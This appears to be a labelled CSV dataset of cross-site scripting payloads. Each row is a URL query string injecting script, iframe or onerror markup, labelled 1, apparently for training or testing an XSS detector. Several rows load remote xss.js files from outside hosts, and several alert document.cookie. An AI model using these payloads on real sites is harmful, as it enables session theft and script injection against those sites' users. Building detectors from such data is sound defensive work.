Payload,Label
query=x%22%3E%3CsCRipT%3Ealert%28123%29%3C%2FSCrIpT%<br/>3E%22,1
keyword=x%22%3E%3CsCRipT%3Ealert%28123%29%3C%2FSCrIpT%3E%22&o<br/>pt=0,1
offset='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E<br/>%3C/SCRIPT%3E,1
href=http://xssed.com,1
lid=it&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
message=true&age=none&price=0&category=0&keyword=%22%<br/>3E%3Ciframe+src%3Djavascript%3Aalert%28%27xssed%27%29%3B+style%3Ddisplay%3Anone%3B+%2F%3E%3Cspan+id%<br/>3D%22&search%5Ftype=exact&MSCSProfile=JD1P4KJ4S5PF9NW8UJ6QF43GKJD51L58,1
product%5Fcode=78952&index=0&MSCSProfile=JD1P4KJ<br/>4S5PF9NW8UJ6QF43GKJD51L58,1
lid=es&tid=aleborg&f_user=&six=&f_email=http://www.auto<br/>komis-styl.pl/webmail/index.php?lid=pl&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20<br/>Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
tipo=-1&q=x%22%3E%3CscrIpt%3Ealert%28123%29%3C%2FscrIpt%3E%22,1
contentid=x%22%3E%3CscripT%3Ealert(123)%3C/scR<br/>ipt%3E,1
FormName=CorpNameSearch&Words=Starting<br/>&SearchStr=AD+Online'%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E&SearchType=Se<br/>arch,1
w=foobar&tz=%22%3E%3Ciframe%20src=javascript:alert('xssed1');%20style=d<br/>isplay:none;%20/%3E%3Cspan%20id=%22&state=%22%3E%3Ciframe%20src=javascript:alert('xssed2');%20style=<br/>display:none;%20/%3E%3Cspan%20id=%22&section=barfoo,1
buscado=x%22%3E%3CscrIpt%3Ealert%28123%29%3C%2FscrIpt%3E%22&x=0&y<br/>=0,1
search=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&button=S%F<br/>6k&dosearch=1,1
q=x%22%3e%3cscRipt%3ealert(123)%3c%2fScrIpt%<br/>3e%22&o=DateDescending,1
searchtext=x%22%3E%3CscRipt%3Ealert%2812<br/>3%29%3C%2FScrIpt%3E%22&ste=1&x=19&y=19&ay=2005-01-01&as=&al=&anp=&axp=&ab=y,1
q=--%3E%22%3Cscript%3Ealert(/Hacked%20by%20Ingelo/)%3C/script%3E,1
"query=x%22%3E%3CscRipt%3Ealert(123)%3C/Scr<br/>Ipt%3E%22&area=73,65,5,61,63,62,64",1
nosearch=&what=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIp<br/>t%3E%22&where=&lat=&lon=&categoryname=&categoryid=&ddtype=&ddsearch=&ddtitle=&mode=super&op=,1
q=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22,1
q=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&mode=&search_target=a<br/>ll,1
h_search_mode=simple&h_advanced_search=false&t_word=x%22%3E%3<br/>CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&btn_search=S%F6k+i+NE,1
t=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&c=sub-17&<br/>g=municipality-184,1
foo=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
pakyear=2007&pakmonth=10&pakday=02&pakkat=all&pakkom=all&pa<br/>kq=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3E%22&submit=&doc=2381&paksort=ProdName+ASC&pakps=1<br/>0,1
freesearch=x%22%3E%3CscRipt%3Ealert%28123%29%3C%2FScrIpt%3<br/>E%22&year=0&month=0&department=0&args=%2C162&send_form.x=6&send_form.y=5,1
a=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
p_secao=%22%3E%3Cscript%3Ealert(420)%3C/script<br/>%3E,1
d=%22%3Cscript%3Ealert(/Hacked%20by%20Ingelo/)%3C/script%3E,1
f_cd_forum=1&&f_cd_message=%22%3E%3Cscript%3Ealert(420)%3C/<br/>script%3E,1
words=%3C%2Ftitle%3E%3Cscript%3Ealert%28%27xssed%27%29%3<br/>B%3C%2Fscript%3E%3C%2Fhead%3E%3C%21--&SearchString=storepdftoolsforumgeneral&image.x=15&image.y=9,1
http://%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2<br/>ejs%3e%3c%2fSCRIPT%3e,1
id=sadsadapwq&mode=logincheck&yourp=1234%22%3E'%3E%3Cscript%3Ealert('X')%<br/>3C/script%3E,1
id=%22%3E%3Cscript%20src=http://droptix.viralcoders.com/xss.js%3E%3C/sc<br/>ript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2F<br/>script%3E,1
dataarray[dest]=resevent&dataarray[IDseason]=2/index.<br/>xml?q=%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
"url=""><script>alert(document.cookie)</script>><marquee><h1>By+Narc<br/>oticxs</h1></marquee>",1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3<br/>C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%<br/>2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%<br/>29%3C%2Fscript%3E,1
q=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fkusomis<br/>o%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e&p=4&n=20&s=200&o=0,1
searWords=%22%3E%3Cscript%20src%3D%22http%3A%2F%2Fdroptix.viralcoders.c<br/>om%2Fxss.js%22%3E%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C<br/>%2Fscript%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3<br/>E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3<br/>E,1
id=webtool&bn=1&np=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fkusomiso%2ec<br/>om%2fxss%2ejs%3e%3c%2fSCRIPT%3e&mode=wr,1
ComboFalt1=3&TextVal1=%22%3E%3Cscript%3Ea<br/>lert%28123%29%3C%2Fscript%3E&CheckEj2=0&ComboFalt2=3&TextVal2=&CheckEj3=0&ComboFalt3=6&TextVal3=&Tex<br/>tFrom=&TextTom=&ComboAvdelningar=&ComboSortOrder=1&ComboEnheter=&RadioDisplayResult=1&submit1=S%F6k,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123<br/>%29%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscri<br/>pt%3E,1
q=%27%3e%22%3e%3cSCRIPT%2fSRC%3dhttp%3a%2f%2fk<br/>usomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e&p=1&btnS=%8C%9F%8D%F5&s=200&n=20,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%<br/>3C%2Fscript%3E,1
keyword=doc+de+instalacion+apache/search.php?keyword=<br/>%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
doAction=liste&treeGUID=f268d600-625f-4650-ab91-b3cfef4c9f0d&sear<br/>ch_47ea4dde-0c1b-4942-926d-4305f08fea42_like=%22%3Cscript%3Ealert(/Hacked%20by%20Ingelo/)%3C/script%<br/>3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&s<br/>ubmit1=++S%F6k+++&RadioDisplayResult=&ComboSortOrder=0,1
lid=nl&tid=aleborg&f_user=&six=&f_email==%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
sec_id='%3Cscript%20src=http://droptix.viralcoders.com/xss.<br/>js%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%<br/>3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
show=songs&query=%22%3E%60%3E%3CsCript%3Ealert%28123%29%3C%2FsCri<br/>pt%3E,1
TextFritext=%22%3E%3Cscript%3E<br/>alert%28123%29%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscrip<br/>t%3E,1
search_text=%22%3E%27%3E%3CsCript%3Ealert%28123%29%3C%2FsCript%3E,1
q=%22%3E%27%3E%3CsCript%3Ealert%28123%29%3C%2FsCript%3E&cl=1,1
_wizard=-//Yahoo//Wizar<br/>ds//AboutMe&_stylesheet=-//Yahoo//Stylesheets//Wizards//Core&_domain=us.z&_whose=ours&image=javascri<br/>pt:document.write('aa')&imgwidth=180&imgheight=180&_filestore=geocities';</script><script>alert(1)</<br/>script>,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2<br/>Fscript%3E,1
query=%22%3E%27%3E%3CsCript%3Ealert%28123%29%3C%2FsCript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3<br/>E,1
q=%22%3E%3Cscript%3Ealert%28%22XSSed+by+Dr.Optix%22%29%3C%2Fscript%<br/>3E&btnG=Google+Search&entqr=0&output=xml_no_dtd&sort=date%3AD%3AL%3Ad1&ie=UTF-8&btnG.y=0&client=defa<br/>ult_frontend&btnG.x=0&ud=1&site=default_collection&oe=UTF-8&proxystylesheet=default_frontend,1
"placementId=1290833&pid=754767&ps=-1&zw=628&zh=150&ur<br/>l=""><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>&v=5&depth=1",1
q=''%22%3E%22%3E%3CsCript%3Ealert(123)%3C/scRipt%3E,1
lid=es&tid=modern_blue&f_user=&six=&f_email==%22<br/>%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe<br/>%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%2<br/>2%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/ifram<br/>e%3E,1
lid=pt&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,1
lid=es&tid=modern_blue&f_user=&six=&f_email==%<br/>22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/ifra<br/>me%3E,1
lid=sk&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch<br/>1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=it&tid=modern_blue&f_user=&six=&f_emai<br/>l==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/<br/>iframe%3E,1
lid=16&tid=0&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code%20S<br/>ervices%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=es&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%2<br/>0Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=ch_big5&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3C<br/>h1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22<br/>%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe<br/>%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email=<br/>=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/if<br/>rame%3E,1
tid=default&lid=de&error=-ERR+%5BAUTH%5D+Password+supplie<br/>d+for+%22123%22+is+incorrect.%0D%0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20<br/>src=http://www.google.com/%3E%3C/iframe%3E,1
tid=default&lid=pt_BR&error==%22%3E%3Ch1%3ENull%20Cod<br/>e%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=7&tid=1&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%<br/>20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
sid=fbc914b3d3de1427b2d5ad60d93faa1d&tid=default&l<br/>id=es&error=-ERR+Unable+to+log+on%0D%0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Cifram<br/>e%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=es&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=6&tid=1&f_user=&six=&f_email==%22%3E%3Ch1%3E<br/>Null%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=it&tid=aleborg&f_user=&six=&f_email==%22%3E%3Ch1%3E<br/>Null%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=es&tid=default&f_user=&six=&f_email==%22%3E%3C<br/>h1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
sid=e42f4bfd67a8003683de7f57442440ec&tid=default&lid=es<br/>&error=-ERR+Login+failed.%0D%0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=<br/>http://www.google.com/%3E%3C/iframe%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29<br/>%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%<br/>28123%29%3C%2Fscript%3E,1
lid=bg&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%3ENull<br/>%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript<br/>%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fs<br/>cript%3E,1
lid=&tid=3&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code%<br/>20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fsc<br/>ript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscr<br/>ipt%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%2812<br/>3%29%3C%2Fscript%3E,1
TextFritext=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%<br/>3E,1
TextFritext=%22%3E%3Cscript%3Ealert%281<br/>23%29%3C%2Fscript%3E,1
lid=es&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=ht,1
"lid=12&tid=2&f_user=&six=&f_email==""><h1>Null<br/>Code Services</h1>=""><iframe%20src=http://www.google.com/></iframe>",1
tid=default&lid=de&error=-ERR+Bad+login%0D%0A=%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=fr&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch<br/>1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Co<br/>de%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
"Stype=SEARCHALL&SID=9eec5015c58c3e127b4b64f61cbfcc4cfd7&WORD=""><br/><script>alert(""BackDoor"")</script>&SW=1024",1
"query==""><script>alert(document.cookie)</script>><marquee><h1>By+www<br/>.r3t.n3t.nl</h1></marquee>",1
lid=16&tid=2&f_user=&six=&f_email==%22%3E%3Ch1%<br/>3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
bottomlimit=0&toplimit=24&subcat=%22%3E%3Cscript%3Ealert(/ROFLz%2<br/>0RoMeO%20ownz%20DarkMindZ.com!/)%3C/script%3E,1
url=x%22%3E'%3E%3CscRipT%3Ealert(123)%3C/ScRIpT%3E%22.gov,1
module=status&chan=%3Cscript%3Ealert(1)%3C/script%3E,1
search_term=x%22%3E%3CsCript%3Ealert%28123%29%3C%2FScr<br/>ipT%3E%22&search_type=0&act=search,1
"cid=""><script>alert(document.cookie)</script>><mar<br/>quee><h1>By+Narcoticxs</h1></marquee>",1
tid=default&lid=de&error=-ERR+Bad+login%0D%0A=%22%3E%3Ch1%3<br/>ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
"Folder=""><script>alert(document.cookie)</script>><marquee><h1<br/>>By+www.r3t.n3t.nl</h1></marquee>",1
query=%3Cscript%3Ealert(%22shadowls%22)%3C/script%3E,1
mode=allwords&search=tindari//site_search.asp?search=%3E%22%<br/>3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
search_term=x%22%3E%3CsCript%3Ealert%281<br/>23%29%3C%2FScripT%3E%22&search_type=8&act=search,1
search=%3E%22%3E%3Cscript%3Ealert%28%27iNs uNkn0wn.eu<br/>CreW%27%29%3C%2Fscript%3E,1
option=com_content&user_rating=1&submit_vote=index2.php?option<br/>=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http:/<br/>/www.xssed.com,1
"redirectUrl=http://redirect.comcast.net/redirect/CheckAuth?redirec<br/>tUrl=""><script>alert(document.cookie)</script>><marquee><h1>By+Narcoticxs</h1></marquee>",1
Terms=%3Cscript%3Ealert%28%22shadowls%22%29%3C%2Fscript%<br/>3E&cb=,1
query=%3Cscript%3Ealert(%22shadowls%22)%3C/script%<br/>3E,1
search=%3E%22%3E%3Cscript%3Ealert%28%27iNs<br/>uNkn0wn.eu CreW%27%29%3C%2Fscript%3E,1
query=x%22%3E%27%3E%3CscRIpT%3Ealert%28123%29%3C%2FSCrIpt%3E,1
http://www.venturaes.com/search.asp?query=%3Cscript%3Ealert(%<br/>22shadowls%22)%3C/script%3E,1
"x_Affiliate=""><script>alert(document.cookie)</scr<br/>ipt>><marquee><h1>By+Narcoticxs</h1></marquee>",1
namek='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/x<br/>ss.js%3E%3C/SCRIPT%3E&sex=%92j&sex=%8F%97&name=&seinen=%8F%BA%98a&seinen=%95%BD%90%AC&year=&month=&d<br/>ay=&jyusyok=&yubin1=&yubin2=&jyusyo=&tel1=&mail=&kensyu=&kinmu1=&yubin3=&yubin4=&kinmu2=&kinmu3=&tel<br/>2=&kinmu4=&syoku=&cyousa=&bikou=&mou1=&2=&3=&submit=%8Am%94F%89%E6%96%CA%82%D6&submit2=%82%E2%82%E8%<br/>92%BC%82%B5,1
keyword=xss_by_kusomiso.com&start=1&to=%27%3Cscript%3Ealert%2<br/>8123456789%29%3B%3C%2Fscript%3E&bbs=operate&mode=,1
lid=dk&tid=hungi.mozilla&f_user=&six=&f_email==%22%3E%3Ch1%3E<br/>Null%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
searchfor=%3Cscript%3Ealert(/XSSed%20by%20Dr.Optix/)%3C/sc<br/>ript%3E&imageField.x=0&imageField.y=0,1
s=%22%3Cscript%3Ealert(/Hacked%20by%20Ingelo/)%3C/script%3E&searchb<br/>utton=S%C3%B8g,1
shopCode=0001&shohinNo=00005686%27%3e%22%3e%3cSCRIPT%2fSRC<br/>%3dhttp%3a%2f%2fkusomiso%2ecom%2fxss%2ejs%3e%3c%2fSCRIPT%3e,1
"q=\""><script>alert(String.fromCharCode(88,83,83))</script>\""<",1
"Stype=SEARCHALL&SID=9eec5015c58c3e127b4b64f61cbfcc4cfd7&WORD=<br/>""><script>alert(""BackDoor"")</script>&SW=1024",1
module=topNav&action=keywordSearch&search=k&keyword=%<br/>22%3E%3C%2Ftitle%3E%3Cbody%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,1
&pag=18&orden=&info=Array&buscar=1&lang=%22%3E%3Csc<br/>ript%3Ealert(420)%3C/script%3E,1
keywords=%22%3E'%3E%3Cscript%3Ealert('X')%3C/script%3E,1
"domain=""><script>alert(1)</script>",1
"Stype=SEARCHALL&SID=9eec5015c58c3e127b4b64f61cbfcc4cfd7&WORD=""><s<br/>cript>alert(""BackDoor"")</script>&SW=1024",1
mode=calendar_entry&calendar_date=20070914&set_year=20%22%3E'%3E<br/>%3Cscript%3Ealert('Xss')%3C/script%3E07&set_month=09,1
id=41&mode=individual&no=53%22%3E'%3E%3Cscript%3Ealert('Xss')%3C/s<br/>cript%3E&eid=2271,1
search=%3Cscript%3Ealert(%22shadowls%22)%3C/script%3E,1
Terms=%3Cscript%3Ealert%28%22shadowls%22%29%3C%2Fscript%3E<br/>&cb=&type=,1
id=2&mode=individual&no=14&eid=374%22%3E'%3E%3Cscript%3Ealert('X')%3C<br/>/script%3E,1
data=1Z0kuGA7H-8489-mmJWYdK3xE&t='%3E%22%3E%3CIMG%20src=no_su<br/>ch_icon%20onerror=alert(document.cookie);%3E%3Cmarquee%3E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E%3C/marqu<br/>ee%3E,1
Query=%3Cscript%3Ealert(%22shadowls%22)%3C/script%3E,1
"id=""<script>alert(""netfish"")</script>",1
type=category&id=%22';</script>%3E%3Cscript%3Ealert(document<br/>.cookie)%3C/script%3E%3E%3Cmarquee%3E%3Ch1%3EBy+Narcoticxs%3C/h1%3E%3C/marquee%3E,1
tid=default&lid=dk&error=4703f3252dfe6+NO+Login+failed.%0D%<br/>0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/<br/>iframe%3E,1
"query=""><script>alert(""G3"")</script>",1
q=%3C/title%3E%3Cscript%3Ealert(/xssed/);%3C/script%3E%3C/head%3E%3<br/>C!--,1
lid=3&tid=&f_user=&six=&f_email==%22%3E%3Ch1%3ENull%20Code%20Serv<br/>ices%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
subject2=Nutrition%22%3E'%3E%3Cscript%3Ealer<br/>t('Xss')%3C/script%3E,1
lid=dk&tid=default&f_user=&six=&f_email==%22%3E%3<br/>Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
s=x%22%3E%3CsCRipT%3Ealert%28123%29%3C%2FSCrIpT%3E%22&x=0&y=0<br/>&type=all,1
lid=th&tid=default&f_user=&six=&f_email==%22%3E%3Ch1%3ENull<br/>%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
lid=ru_KOI&tid=beauvoir&f_user=&six=&f_email==%22%3E%3<br/>Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,1
search=%3Cscript%3Ealert%28%27s0h+rul<br/>es+y0u%27%29%3C%2Fscript%3E&x=0&y=0,1
action=cat_id&home=%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js<br/>%3E%3C/SCRIPT%3E,1
search=><script>alert('Xss')</script>><mar<br/>quee><h1>www.nullcode.com.ar</h1></marquee>,1
keywords=%3Cscript%3Ealert%28%27Romanian+President+Website+XSSed+<br/>by+Dr.Optix%5Cn%5CnUniti-va+si+luptati+fratilor%21%5CnUnite+and+fight+brothers%21%5Cn%5Cn-----------<br/>-------%5CnG-Girl%5Cnpasswrdyserv%5CnThe_Flash%5CnOrijinal%5Cnnetfish%5CnWolfrat%5CnAc1d%5Cnand+many<br/>+others%5Cn------------------%5Cn%5CnWith+love+Dr.Optix%27%29%3C%2Fscript%3E&doc=0&s_tema=orice&adel<br/>a%5Bzi%5D=&adela%5Bluna%5D=&adela%5Ban%5D=&ala%5Bzi%5D=&ala%5Bluna%5D=&ala%5Ban%5D=&ok=Cauta&off=0&i<br/>s=center&_RID=search,1
MT=%22%3E%3Cscript%3Ealert(420)%3C/script%3E,1
AcronymOptions=Begins'%3E%22%3E%3CSCRIPT/SRC=http<br/>://kusomiso.com/xss.js%3E%3C/SCRIPT%3Eth:&Acronym=&definition=&Source=All,1
in_query=+%3E%22%3E%3Cscript%3Ealert%<br/>28%22XSS%22%29%3C%2Fscript%3E&Trova=Trova,1
lang=es=%22%3E%3Ciframe%20src=http:/<br/>/www.google.com/%3E%3C/iframe%3E,1
Interface=quick&Position='%3E%22%3E%3CSCRIPT/SRC=ht<br/>tp://kusomiso.com/xss.js%3E%3C/SCRIPT%3E&SURVEY=Digitized+Sky+Survey,1
Sw=Discipline%'%<br/>3E%22%3E%3CSCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E,1
q=%3Ctitle%3E%3Cscript%3Ealert('xssed');%3C/script%3E%3C/head%3E%3C!-<br/>-&z=,1
radWord=Any&radSearchType=Keywo<br/>rd&txtTitle=&selWard=0&txtAddress=&intPg=1&intOtherPg=1&sX=0&sY=0&intWard=0&selKeyword='%3E%22%3E%3C<br/>SCRIPT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3EWidows,1
shop=All&Query=%22%3E--%3E%3Cscript%3Ealert%28document.<br/>cookie%29%3C%2Fscript%3E%3C%22&Search=Search,1
txtSearch='%3E%22%3E%3CSCRIPT/SRC=http://kusomiso.c<br/>om/xss.js%3E%3C/SCRIPT%3E,1
do=search&txtsearch=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
A=383&BMDRN=2000&BCOB=0&C=%22%3Cscript%3Ealert<br/>(1)%3C/script%3E,1
